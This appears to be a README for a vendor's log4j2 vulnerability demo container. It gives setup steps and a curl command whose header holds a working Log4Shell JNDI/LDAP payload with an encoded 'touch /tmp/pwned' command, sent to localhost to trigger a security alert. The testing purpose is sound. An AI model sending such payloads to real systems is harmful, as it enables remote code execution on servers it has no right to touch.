In order to test the log4j2 vulnerability:

1. Have a log4j2 configuration file with the logzio token and listener.

2. Build/pull the docker image and run:
   docker run -v $(pwd)/log4j2.xml:/app/log4j2.xml -p 8080:8080 logzio/log4j2-vulnerability-demo

3. run: curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://127.0.0.1:1388/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
   This simulate a jndi attack and should trigger alert in our system.

Additional options:

1. Use the browser (or curl) and go to localhost:8080/students/init to initialize a list of student (logs will be sent to the logzio app)

2. Use the browser (or curl) and go to localhost:8080/students/all to get all the students full names (logs will be sent to the logzio app)
